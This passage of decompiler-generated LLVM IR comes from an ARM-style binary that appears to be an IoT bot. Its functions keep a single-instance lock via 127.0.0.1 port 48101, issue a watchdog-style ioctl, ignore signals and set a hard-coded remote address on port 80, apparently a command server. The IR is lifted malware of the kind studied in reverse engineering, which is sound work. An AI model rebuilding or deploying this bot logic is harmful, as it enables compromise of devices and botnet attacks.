  %v2_e79c = add i32 %storemerge127.in, %v1_e79c.pre
  %v3_e79c = inttoptr i32 %v2_e79c to i8*
  %v4_e79c = load i8, i8* %v3_e79c, align 1
  %v6_e79c = zext i8 %v4_e79c to i32
  store i32 %v6_e79c, i32* %r3.global-to-local, align 4
  %v9_e7a0 = icmp eq i8 %v4_e79c, %v4_e798
  br i1 %v9_e7a0, label %dec_label_pc_e780, label %dec_label_pc_e7ac

dec_label_pc_e7ac:                                ; preds = %dec_label_pc_e798
  br label %dec_label_pc_e790.backedge

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_e7cc
  %v1_e7b4 = add i32 %v1_e7cc, 1
  store i32 %v1_e7b4, i32* @lr, align 4
  %v9_e7b8 = icmp eq i32 %v3_e6f0, %v1_e7b4
  br i1 %v9_e7b8, label %dec_label_pc_e85c, label %dec_label_pc_e7c4.backedge

dec_label_pc_e7c4.backedge:                       ; preds = %dec_label_pc_e7b4, %dec_label_pc_e7e0
  %v1_e7cc148 = phi i32 [ 0, %dec_label_pc_e7e0 ], [ %v1_e7b4, %dec_label_pc_e7b4 ]
  %storemerge126 = add i32 %storemerge126.in, 1
  %v2_e7c4 = icmp eq i32 %v0_e7c4, 0
  br i1 %v2_e7c4, label %dec_label_pc_e708, label %dec_label_pc_e7cc

dec_label_pc_e7cc:                                ; preds = %dec_label_pc_e7c4.backedge, %dec_label_pc_e7cc.lr.ph
  %v0_e7c4.in = phi i32 [ %v0_e758107, %dec_label_pc_e7cc.lr.ph ], [ %v0_e7c4, %dec_label_pc_e7c4.backedge ]
  %storemerge126.in = phi i32 [ 0, %dec_label_pc_e7cc.lr.ph ], [ %storemerge126, %dec_label_pc_e7c4.backedge ]
  %v1_e7cc = phi i32 [ 0, %dec_label_pc_e7cc.lr.ph ], [ %v1_e7cc148, %dec_label_pc_e7c4.backedge ]
  %v0_e7c4 = add i32 %v0_e7c4.in, -1
  %v2_e7cc = add i32 %v1_e7cc, %v0_e7cc.pre
  %v3_e7cc = inttoptr i32 %v2_e7cc to i8*
  %v4_e7cc = load i8, i8* %v3_e7cc, align 1
  %v6_e7cc = zext i8 %v4_e7cc to i32
  store i32 %v6_e7cc, i32* %r2.global-to-local, align 4
  %v2_e7d0 = add i32 %storemerge126.in, %v1_e7d0.pre
  %v3_e7d0 = inttoptr i32 %v2_e7d0 to i8*
  %v4_e7d0 = load i8, i8* %v3_e7d0, align 1
  %v6_e7d0 = zext i8 %v4_e7d0 to i32
  store i32 %v6_e7d0, i32* %r3.global-to-local, align 4
  %v9_e7d4 = icmp eq i8 %v4_e7d0, %v4_e7cc
  br i1 %v9_e7d4, label %dec_label_pc_e7b4, label %dec_label_pc_e7e0

dec_label_pc_e7e0:                                ; preds = %dec_label_pc_e7cc
  br label %dec_label_pc_e7c4.backedge

dec_label_pc_e7e8:                                ; preds = %dec_label_pc_e800
  %v1_e7e8 = add i32 %v1_e800, 1
  store i32 %v1_e7e8, i32* @lr, align 4
  %v9_e7ec = icmp eq i32 %v3_e70c, %v1_e7e8
  br i1 %v9_e7ec, label %dec_label_pc_e85c, label %dec_label_pc_e7f8.backedge

dec_label_pc_e7f8.backedge:                       ; preds = %dec_label_pc_e7e8, %dec_label_pc_e814
  %v1_e800157 = phi i32 [ 0, %dec_label_pc_e814 ], [ %v1_e7e8, %dec_label_pc_e7e8 ]
  %storemerge125 = add i32 %storemerge125.in, 1
  %v2_e7f8 = icmp eq i32 %v0_e7f8, 0
  br i1 %v2_e7f8, label %dec_label_pc_e724, label %dec_label_pc_e800

dec_label_pc_e800:                                ; preds = %dec_label_pc_e7f8.backedge, %dec_label_pc_e800.lr.ph
  %v0_e7f8.in = phi i32 [ %v0_e758107, %dec_label_pc_e800.lr.ph ], [ %v0_e7f8, %dec_label_pc_e7f8.backedge ]
  %storemerge125.in = phi i32 [ 0, %dec_label_pc_e800.lr.ph ], [ %storemerge125, %dec_label_pc_e7f8.backedge ]
  %v1_e800 = phi i32 [ 0, %dec_label_pc_e800.lr.ph ], [ %v1_e800157, %dec_label_pc_e7f8.backedge ]
  %v0_e7f8 = add i32 %v0_e7f8.in, -1
  %v2_e800 = add i32 %v1_e800, %v0_e800.pre
  %v3_e800 = inttoptr i32 %v2_e800 to i8*
  %v4_e800 = load i8, i8* %v3_e800, align 1
  %v6_e800 = zext i8 %v4_e800 to i32
  store i32 %v6_e800, i32* %r2.global-to-local, align 4
  %v2_e804 = add i32 %storemerge125.in, %v1_e804.pre
  %v3_e804 = inttoptr i32 %v2_e804 to i8*
  %v4_e804 = load i8, i8* %v3_e804, align 1
  %v6_e804 = zext i8 %v4_e804 to i32
  store i32 %v6_e804, i32* %r3.global-to-local, align 4
  %v9_e808 = icmp eq i8 %v4_e804, %v4_e800
  br i1 %v9_e808, label %dec_label_pc_e7e8, label %dec_label_pc_e814

dec_label_pc_e814:                                ; preds = %dec_label_pc_e800
  br label %dec_label_pc_e7f8.backedge

dec_label_pc_e81c:                                ; preds = %dec_label_pc_e834
  %v1_e81c = add i32 %v1_e834, 1
  store i32 %v1_e81c, i32* @lr, align 4
  %v9_e820 = icmp eq i32 %v3_e728, %v1_e81c
  br i1 %v9_e820, label %dec_label_pc_e85c, label %dec_label_pc_e82c.backedge

dec_label_pc_e82c.backedge:                       ; preds = %dec_label_pc_e81c, %dec_label_pc_e848
  %v1_e834166 = phi i32 [ 0, %dec_label_pc_e848 ], [ %v1_e81c, %dec_label_pc_e81c ]
  %storemerge = add i32 %storemerge.in, 1
  %v2_e82c = icmp eq i32 %v0_e82c, 0
  br i1 %v2_e82c, label %dec_label_pc_e740, label %dec_label_pc_e834

dec_label_pc_e834:                                ; preds = %dec_label_pc_e82c.backedge, %dec_label_pc_e834.lr.ph
  %v0_e82c.in = phi i32 [ %v0_e758107, %dec_label_pc_e834.lr.ph ], [ %v0_e82c, %dec_label_pc_e82c.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_e834.lr.ph ], [ %storemerge, %dec_label_pc_e82c.backedge ]
  %v1_e834 = phi i32 [ 0, %dec_label_pc_e834.lr.ph ], [ %v1_e834166, %dec_label_pc_e82c.backedge ]
  %v0_e82c = add i32 %v0_e82c.in, -1
  %v2_e834 = add i32 %v1_e834, %v0_e834.pre
  %v3_e834 = inttoptr i32 %v2_e834 to i8*
  %v4_e834 = load i8, i8* %v3_e834, align 1
  %v6_e834 = zext i8 %v4_e834 to i32
  store i32 %v6_e834, i32* %r2.global-to-local, align 4
  %v2_e838 = add i32 %storemerge.in, %v1_e838.pre
  %v3_e838 = inttoptr i32 %v2_e838 to i8*
  %v4_e838 = load i8, i8* %v3_e838, align 1
  %v6_e838 = zext i8 %v4_e838 to i32
  store i32 %v6_e838, i32* %r3.global-to-local, align 4
  %v9_e83c = icmp eq i8 %v4_e838, %v4_e834
  br i1 %v9_e83c, label %dec_label_pc_e81c, label %dec_label_pc_e848

dec_label_pc_e848:                                ; preds = %dec_label_pc_e834
  br label %dec_label_pc_e82c.backedge

dec_label_pc_e850:                                ; preds = %dec_label_pc_e760
  %v1_e850 = add i32 %v1_e764, 1
  %v9_e854 = icmp eq i32 %v3_e744, %v1_e850
  br i1 %v9_e854, label %dec_label_pc_e85c, label %dec_label_pc_e778

dec_label_pc_e85c:                                ; preds = %dec_label_pc_e780, %dec_label_pc_e7b4, %dec_label_pc_e7e8, %dec_label_pc_e81c, %dec_label_pc_e850
  %v1_e860 = call i32 @function_119f4(i32 12)
  %v1_e868 = call i32 @function_119f4(i32 13)
  %v1_e870 = call i32 @function_119f4(i32 14)
  %v1_e878 = call i32 @function_119f4(i32 15)
  %v1_e880 = call i32 @function_119f4(i32 16)
  store i32 %v2_e618, i32* @r0, align 4
  %v1_e888 = call i32 @function_15b20(i32 %v2_e618)
  %v0_e88c = load i32, i32* @r7, align 4
  store i32 %v0_e88c, i32* @r0, align 4
  %v2_e894 = call i32 @function_14dd8(i32 %v0_e88c, i32 9)
  br label %dec_label_pc_e898

dec_label_pc_e898:                                ; preds = %dec_label_pc_e60c, %dec_label_pc_e8cc, %dec_label_pc_e85c
  %v2_e8a4 = call i32 @function_123b8(i32 %v2_e494, i32 64)
  %v2_e8b4 = call i32 @function_123b8(i32 %v2_e4e4, i32 64)
  %v1_e8bc = call i32 @function_15c0c(i32 1)
  store i32 %v2_e468, i32* @r4, align 4
  %v0_e8c4 = load i32, i32* @r7, align 4
  store i32 %v0_e8c4, i32* @r5, align 4
  br label %dec_label_pc_e3b8.backedge

dec_label_pc_e8cc:                                ; preds = %dec_label_pc_e6b8.backedge, %dec_label_pc_e628
  %v1_e8d0 = call i32 @function_119f4(i32 12)
  %v1_e8d8 = call i32 @function_119f4(i32 13)
  %v1_e8e0 = call i32 @function_119f4(i32 14)
  %v1_e8e8 = call i32 @function_119f4(i32 15)
  %v1_e8f0 = call i32 @function_119f4(i32 16)
  store i32 %v2_e618, i32* @r0, align 4
  %v1_e8f8 = call i32 @function_15b20(i32 %v2_e618)
  br label %dec_label_pc_e898

; uselistorder directives
  uselistorder i32 %v1_e850, { 1, 0 }
  uselistorder i32 %v1_e764, { 1, 0 }
  uselistorder i32 %v0_e778, { 1, 0 }
  uselistorder i32 %v3_e6c4, { 1, 0 }
  uselistorder i32 %v0_e758107, { 2, 1, 0, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %v2_e618, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i1 %v7_e5f0, { 1, 0 }
  uselistorder i32 %v2_e5ec, { 1, 0 }
  uselistorder i32 %v2_e3bc, { 1, 0 }
  uselistorder i32 %stack_var_-8428.1.be, { 1, 0 }
  uselistorder i32 %v3_e544, { 1, 2, 0 }
  uselistorder i32 %v2_e44c, { 1, 0 }
  uselistorder i32 %v1_e3ec, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_e3c8, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8428.0, { 1, 0 }
  uselistorder i32 %v2_e6b4, { 1, 0, 2 }
  uselistorder i32 %v2_e4e4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e494, { 1, 2, 4, 3, 0, 5, 6 }
  uselistorder i32 %v3_e35c, { 1, 0 }
  uselistorder i32 %v2_e328, { 2, 0, 3, 1 }
  uselistorder i32 %v3_e2d4, { 1, 0, 2 }
  uselistorder i32 %v1_e2c4, { 4, 3, 2, 0, 5, 7, 6, 9, 8, 10, 1, 11, 12, 13, 14 }
  uselistorder i32 %v3_e244, { 2, 1, 0 }
  uselistorder i32 %v3_e1f0, { 1, 2, 0 }
  uselistorder i32 %storemerge184, { 1, 0 }
  uselistorder i32 %v0_e17c, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-76, { 1, 2, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 7, 9, 8, 19, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 2 }
  uselistorder i32 (i8*, i32, i32)* @function_12680, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 (i32*)* @function_12b8c, { 2, 0, 1 }
  uselistorder i32 (i32*)* @function_12c08, { 8, 7, 0, 3, 4, 5, 2, 6, 1 }
  uselistorder i32 (i32)* @function_12bbc, { 0, 2, 1 }
  uselistorder i32 52, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_15bdc, { 1, 0, 3, 2 }
  uselistorder i32 (i8, i32, i32)* @function_12824, { 1, 0, 2 }
  uselistorder i32* @global_var_22910.109, { 2, 0, 3, 1, 4 }
  uselistorder i32* @global_var_22914.101, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e898, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e85c, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e82c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e7f8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e7c4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e790.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e778, { 1, 0 }
  uselistorder label %dec_label_pc_e6d0, { 1, 0 }
  uselistorder label %dec_label_pc_e60c, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_e3b8.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_e5a0, { 1, 0 }
  uselistorder label %dec_label_pc_e3c8, { 1, 0 }
  uselistorder label %dec_label_pc_e3c8.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_e270, { 1, 0 }
  uselistorder label %dec_label_pc_e21c, { 1, 0 }
  uselistorder label %dec_label_pc_e1a8, { 0, 2, 1 }
}

define i32 @function_e910(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e910:
  store i32 ptrtoint (i32* @global_var_eaa8.114 to i32), i32* @global_var_222f0.116, align 4
  ret i32 %arg1
}

define i32 @function_e928() local_unnamed_addr {
dec_label_pc_e928:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_e928 = load i32, i32* @r4, align 4
  %v6_e928 = load i32, i32* @r5, align 4
  %v9_e928 = load i32, i32* @r6, align 4
  %v12_e928 = load i32, i32* @r7, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_e944 = call i32 @function_14b54(i32 2, i32 1, i32 0)
  store i32 %v3_e944, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_222e8.118 to i32), i32* @r6, align 4
  %v7_e94c = icmp eq i32 %v3_e944, -1
  store i32 %v3_e944, i32* @global_var_222e8.118, align 4
  br i1 %v7_e94c, label %dec_label_pc_ea00, label %dec_label_pc_e958

dec_label_pc_e958:                                ; preds = %dec_label_pc_e928
  %v2_e958 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_e958, i32* @r3, align 4
  %v0_e95c = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  store i32 2, i32* @r2, align 4
  %v5_e96c = call i32 @function_14ae4(i32 %v3_e944, i32 %v0_e95c, i32 2, i32 %v2_e958, i32 4)
  %v2_e970 = load i32, i32* @global_var_222e8.118, align 4
  store i32 %v2_e970, i32* @r4, align 4
  %v3_e980 = call i32 @function_12f68(i32 %v2_e970, i32 3, i32 0)
  store i32 ptrtoint (i8** @global_var_222f4.120 to i32), i32* @r7, align 4
  %v1_e988 = or i32 %v3_e980, 2048
  %v0_e98c = load i32, i32* @r5, align 4
  %v0_e990 = load i32, i32* @r4, align 4
  %v3_e994 = call i32 @function_12f68(i32 %v0_e990, i32 %v0_e98c, i32 %v1_e988)
  %v2_e998 = load i8, i8* bitcast (i8** @global_var_222f4.120 to i8*), align 4
  %v2_e99c = icmp eq i8 %v2_e998, 0
  store i32 2, i32* %stack_var_-44, align 4
  br i1 %v2_e99c, label %dec_label_pc_e9ac, label %dec_label_pc_ea0c

dec_label_pc_e9ac:                                ; preds = %dec_label_pc_e958
  br label %dec_label_pc_e9b4

dec_label_pc_e9b4:                                ; preds = %dec_label_pc_ea0c, %dec_label_pc_e9ac
  %v1_e9c0 = call i32 @function_1484c(i32 48101)
  %v0_e9c8 = call i32 @function_12ecc()
  store i32 0, i32* @r4, align 4
  %v2_e9d0 = inttoptr i32 %v0_e9c8 to i32*
  store i32 0, i32* %v2_e9d0, align 4
  %v2_e9d4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_e9d4, i32* @r5, align 4
  %v2_e9d8 = load i32, i32* @global_var_222e8.118, align 4
  store i32 16, i32* @r2, align 4
  %v3_e9e4 = call i32 @function_14770(i32 %v2_e9d8, i32 %v2_e9d4, i32 16)
  %v7_e9e8 = icmp eq i32 %v3_e9e4, -1
  br i1 %v7_e9e8, label %dec_label_pc_ea20, label %dec_label_pc_e9f0

dec_label_pc_e9f0:                                ; preds = %dec_label_pc_e9b4
  %v2_e9f8 = load i32, i32* @global_var_222e8.118, align 4
  store i32 %v2_e9f8, i32* @r0, align 4
  %v2_e9fc = call i32 @function_149a8(i32 %v2_e9f8, i32 1)
  br label %dec_label_pc_ea00

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e928, %dec_label_pc_ea30, %dec_label_pc_e9f0
  %v1_ea08 = phi i32 [ %v3_e944, %dec_label_pc_e928 ], [ %v0_ea80, %dec_label_pc_ea30 ], [ %v2_e9fc, %dec_label_pc_e9f0 ]
  store i32 %v3_e928, i32* @r4, align 4
  store i32 %v6_e928, i32* @r5, align 4
  store i32 %v9_e928, i32* @r6, align 4
  store i32 %v12_e928, i32* @r7, align 4
  ret i32 %v1_ea08

dec_label_pc_ea0c:                                ; preds = %dec_label_pc_e958
  %v1_ea14 = call i32 @function_14828(i32 2130706433)
  br label %dec_label_pc_e9b4

dec_label_pc_ea20:                                ; preds = %dec_label_pc_e9b4
  %v0_ea20 = call i32 @function_12ecc()
  %v1_ea24 = inttoptr i32 %v0_ea20 to i32*
  %v2_ea24 = load i32, i32* %v1_ea24, align 4
  %v7_ea28 = icmp eq i32 %v2_ea24, 99
  br i1 %v7_ea28, label %dec_label_pc_ea88, label %dec_label_pc_ea30

dec_label_pc_ea30:                                ; preds = %dec_label_pc_ea88, %bb, %dec_label_pc_ea20
  store i32 2, i32* %stack_var_-44, align 4
  %v1_ea48 = call i32 @function_1484c(i32 48101)
  %v2_ea58 = load i32, i32* @global_var_222e8.118, align 4
  %v3_ea5c = call i32 @function_14798(i32 %v2_ea58, i32 %v2_e9d4, i32 16)
  %v1_ea64 = call i32 @function_15c0c(i32 5)
  %v2_ea68 = load i32, i32* @global_var_222e8.118, align 4
  store i32 %v2_ea68, i32* @r0, align 4
  %v1_ea6c = call i32 @function_15b20(i32 %v2_ea68)
  %v1_ea78 = call i32 @function_1484c(i32 48101)
  %v1_ea7c = call i32 @function_dc00(i32 %v1_ea78)
  %v0_ea80 = call i32 @function_e928()
  br label %dec_label_pc_ea00

dec_label_pc_ea88:                                ; preds = %dec_label_pc_ea20
  %v2_ea88 = load i8, i8* bitcast (i8** @global_var_222f4.120 to i8*), align 4
  %v3_ea88 = zext i8 %v2_ea88 to i32
  %v1_ea8c = load i32, i32* @r4, align 4
  %v9_ea8c = icmp eq i32 %v3_ea88, %v1_ea8c
  br i1 %v9_ea8c, label %dec_label_pc_ea30, label %bb

bb:                                               ; preds = %dec_label_pc_ea88
  %v2_ea94 = trunc i32 %v1_ea8c to i8
  store i8 %v2_ea94, i8* bitcast (i8** @global_var_222f4.120 to i8*), align 4
  br label %dec_label_pc_ea30

; uselistorder directives
  uselistorder i32 %v3_e944, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_dc00, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_149a8, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @function_14770, { 3, 0, 2, 1 }
  uselistorder i8* bitcast (i8** @global_var_222f4.120 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_222f4.120, { 1, 0 }
  uselistorder i32* @global_var_222e8.118, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_ea30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ea00, { 1, 2, 0 }
}

define i32 @function_eaa8(i32 %arg1) local_unnamed_addr {
dec_label_pc_eaa8:
  %v1_eab0 = call i32 @function_11a94(i32 3)
  %v3_eabc = call i32 @function_119d0(i32 3, i32* null)
  %v1_eac0 = call i32 @function_f874(i32 %v3_eabc)
  store i32 %v1_eac0, i32* @r6, align 4
  %v1_eacc = call i32 @function_119f4(i32 3)
  %v0_ead0 = load i32, i32* @r6, align 4
  %v2_ead0 = icmp eq i32 %v0_ead0, 0
  br i1 %v2_ead0, label %dec_label_pc_eb20, label %dec_label_pc_ead8

dec_label_pc_ead8:                                ; preds = %dec_label_pc_eaa8
  %v1_ead8 = add i32 %v0_ead0, 4
  %v2_ead8 = inttoptr i32 %v1_ead8 to i32*
  %v3_ead8 = load i32, i32* %v2_ead8, align 4
  store i32 %v3_ead8, i32* @r4, align 4
  %v0_eadc = call i32 @function_f570()
  %v0_eae0 = load i32, i32* @r6, align 4
  %v1_eae0 = inttoptr i32 %v0_eae0 to i8*
  %v2_eae0 = load i8, i8* %v1_eae0, align 1
  %v3_eae0 = zext i8 %v2_eae0 to i32
  %v2_eae4 = call i32 @function_12a1c(i32 %v0_eadc, i32 %v3_eae0)
  store i32 ptrtoint (i16** @global_var_22918.123 to i32), i32* @r5, align 4
  %v0_eaec = load i32, i32* @r4, align 4
  %v4_eaec = mul nuw nsw i32 %v3_eae0, 4
  %v5_eaec = add i32 %v0_eaec, %v4_eaec
  %v6_eaec = inttoptr i32 %v5_eaec to i32*
  %v7_eaec = load i32, i32* %v6_eaec, align 4
  %v0_eaf0 = load i32, i32* @r6, align 4
  store i32 %v7_eaec, i32* @global_var_2291c.124, align 4
  %v1_eaf8 = call i32 @function_f84c(i32 %v0_eaf0)
  %v1_eb00 = call i32 @function_11a94(i32 4)
  %v3_eb0c = call i32 @function_119d0(i32 4, i32* null)
  %v4_eb0c = inttoptr i32 %v3_eb0c to i16*
  %v3_eb10 = load i16, i16* %v4_eb0c, align 2
  store i16 %v3_eb10, i16* bitcast (i32* @global_var_2291a.125 to i16*), align 4
  %v1_eb1c = call i32 @function_119f4(i32 4)
  br label %dec_label_pc_eb20

dec_label_pc_eb20:                                ; preds = %dec_label_pc_eaa8, %dec_label_pc_ead8
  %v1_eb24 = phi i32 [ %v1_eacc, %dec_label_pc_eaa8 ], [ %v1_eb1c, %dec_label_pc_ead8 ]
  ret i32 %v1_eb24

; uselistorder directives
  uselistorder label %dec_label_pc_eb20, { 1, 0 }
}

define i32 @function_eb2c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_eb2c:
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-76 = alloca i8, align 1
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-142 = alloca i32, align 4
  %stack_var_-174 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-110 = alloca i8, align 1
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %v9_eb2c = load i32, i32* @r6, align 4
  %v2_eb3c = ptrtoint i32* %stack_var_-340 to i32
  store i32 %v2_eb3c, i32* @r4, align 4
  store i32 %arg1, i32* @sb, align 4
  %v2_eb44 = load i32, i32* %arg2, align 4
  store i32 %v2_eb44, i32* @r0, align 4
  store i32 %tmp, i32* @sl, align 4
  %v1_eb4c = call i32 @function_15c40(i32 %v2_eb44)
  %v2_eb54 = call i32 @function_14ea4(i32* nonnull %stack_var_-340)
  %v2_eb60 = call i32 @function_14e3c(i32 %v2_eb3c, i32 2)
  store i32 0, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v0_eb70 = call i32 @function_14f10()
  %v2_eb7c = call i32 @function_14eb8(i32 17, i32 1)
  %v2_eb88 = call i32 @function_14eb8(i32 5, i32 59664)
  %v3_eb94 = call i32 @function_130e0(i32 ptrtoint ([14 x i8]* @global_var_197d4.128 to i32), i32 2)
  %v7_eb98 = icmp eq i32 %v3_eb94, -1
  store i32 %v3_eb94, i32* @r4, align 4
  br i1 %v7_eb98, label %dec_label_pc_ef48, label %dec_label_pc_eba4

dec_label_pc_eba4:                                ; preds = %dec_label_pc_ef48, %dec_label_pc_eb2c
  %v0_ebb8 = phi i32 [ %v3_ef50, %dec_label_pc_ef48 ], [ %v3_eb94, %dec_label_pc_eb2c ]
  store i32 %v0_ebb8, i32* @r0, align 4
  %v2_ebbc = ptrtoint i32* %stack_var_-52 to i32
  store i32 1, i32* %stack_var_-52, align 4
  %v5_ebc4 = call i32 @function_145a4(i32 %v0_ebb8, i32 -2147199228, i32 %v2_ebbc, i32 1, i32 1)
  %v0_ebc8 = load i32, i32* @r4, align 4
  store i32 %v0_ebc8, i32* @r0, align 4
  %v1_ebcc = call i32 @function_15b20(i32 %v0_ebc8)
  br label %dec_label_pc_ebd0

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_ef48, %dec_label_pc_eba4
  store i32 ptrtoint (i32* @global_var_19784.21 to i32), i32* @r0, align 4
  %v1_ebd4 = call i32 @function_15b04(i32 ptrtoint (i32* @global_var_19784.21 to i32))
  %v0_ebd8 = call i32 @function_125e0()
  store i32 ptrtoint (i16** @global_var_22918.123 to i32), i32* @r4, align 4
  store i32 %v0_ebd8, i32* @global_var_2290c.90, align 4
  store i16 2, i16* bitcast (i16** @global_var_22918.123 to i16*), align 4
  %v1_ebf4 = call i32 @function_14828(i32 1105119797)
  store i32 %v1_ebf4, i32* @global_var_2291c.124, align 4
  %v1_ec00 = call i32 @function_1484c(i32 80)
  %v2_ec00 = trunc i32 %v1_ec00 to i16
  %v2_ec08 = ptrtoint i8* %stack_var_-110 to i32
  store i32 %v2_ec08, i32* @fp, align 4
  store i16 %v2_ec00, i16* bitcast (i32* @global_var_2291a.125 to i16*), align 4
  %v0_ec1c = load i32, i32* @sl, align 4
  %v1_ec1c = inttoptr i32 %v0_ec1c to i32*
  %v2_ec1c = load i32, i32* %v1_ec1c, align 4
  store i32 %v2_ec1c, i32* @r8, align 4
  %v4_ec20 = bitcast i8* %stack_var_-110 to i16*
  %v5_ec20 = call i32 @function_150f0(i16* %v4_ec20, i32 ptrtoint ([3 x i8]* @global_var_19828.134 to i32), i32 18)
  store i32 ptrtoint (i32* @global_var_19824.149 to i32), i32* @r4, align 4
  %v13_ec40 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v13_ec40, i32* @lr, align 4
  store i32 59664, i32* %stack_var_-180, align 4
  br i1 icmp eq (i32 add (i32 add (i32 ptrtoint (i32* @global_var_119f4.144 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_e928.137 to i32), i32 ptrtoint (i32* @global_var_11a94.139 to i32)), i32 72144), i32 ptrtoint (i32* @global_var_11b34.142 to i32))), i32 150180), i32 0), label %dec_label_pc_ec88, label %dec_label_pc_ed94

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ebd0, %dec_label_pc_ed94, %dec_label_pc_ef3c
  %v2_ec8c = ptrtoint i32* %stack_var_-174 to i32
  store i32 %v2_ec8c, i32* @fp, align 4
  %v0_ec90 = call i32 @function_e928()
  %v1_ec94 = call i32 @function_f5cc(i32 %v0_ec90)
  %v2_eca0 = call i32 @function_123b8(i32 %v2_ec8c, i32 32)
  %v0_eca4 = load i32, i32* @sb, align 4
  %v7_eca4 = icmp eq i32 %v0_eca4, 2
  br i1 %v7_eca4, label %dec_label_pc_ef64, label %dec_label_pc_ecac

dec_label_pc_ecac:                                ; preds = %dec_label_pc_ef64, %dec_label_pc_ec88, %dec_label_pc_ef74
  %v0_ecac = call i32 @function_f570()
  %v1_ecb0 = mul i32 %v0_ecac, 4
  %v3_ecb4 = and i32 %v1_ecb0, 12
  %v2_ecbc = ptrtoint i32* %stack_var_-142 to i32
  store i32 %v2_ecbc, i32* @r5, align 4
  %v1_ecc0 = add nuw nsw i32 %v3_ecb4, 12
  store i32 %v1_ecc0, i32* @r4, align 4
  %v2_eccc = bitcast i32* %stack_var_-142 to i8*
  %v3_eccc = call i32 @function_f634(i8* %v2_eccc, i32 %v1_ecc0)
  %v2_ecd0 = ptrtoint i32* %stack_var_-40 to i32
  %v1_ecd4 = load i32, i32* @r4, align 4
  %v2_ecd4 = add i32 %v1_ecd4, %v2_ecd0
  store i32 0, i32* @r6, align 4
  %v0_ece0 = load i32, i32* @sl, align 4
  %v1_ece0 = inttoptr i32 %v0_ece0 to i32*
  %v2_ece0 = load i32, i32* %v1_ece0, align 4
  store i32 %v2_ece0, i32* @r0, align 4
  %v3_ece4 = add i32 %v2_ecd4, -102
  %v4_ece4 = inttoptr i32 %v3_ece4 to i8*
  store i8 0, i8* %v4_ece4, align 1
  %v2_ece8 = inttoptr i32 %v2_ece0 to i8*
  %v3_ece8 = call i32 @function_1234c(i8* %v2_ece8, i32 %v2_ecbc)
  %v0_ecec = call i32 @function_f570()
  store i32 0, i32* @r3, align 4
  %v3_ed08 = mul i32 %v0_ecec, 4
  %v1_ed0c = add i32 %v3_ed08, 12
  store i32 %v1_ed0c, i32* @r4, align 4
  %v3_ed18 = call i32 @function_f634(i8* %v2_eccc, i32 %v1_ed0c)
  store i32 %v2_ecd0, i32* @lr, align 4
  %v1_ed20 = load i32, i32* @r4, align 4
  %v2_ed20 = add i32 %v1_ed20, %v2_ecd0
  %v0_ed24 = load i32, i32* @r6, align 4
  %v1_ed24 = trunc i32 %v0_ed24 to i8
  %v3_ed24 = add i32 %v2_ed20, -102
  %v4_ed24 = inttoptr i32 %v3_ed24 to i8*
  store i8 %v1_ed24, i8* %v4_ed24, align 1
  %v2_ed30 = call i32 @function_131ac(i32 15, i32 %v2_ecbc)
  %v1_ed38 = call i32 @function_11a94(i32 2)
  %v3_ed48 = call i32 @function_119d0(i32 2, i32* nonnull %stack_var_-48)
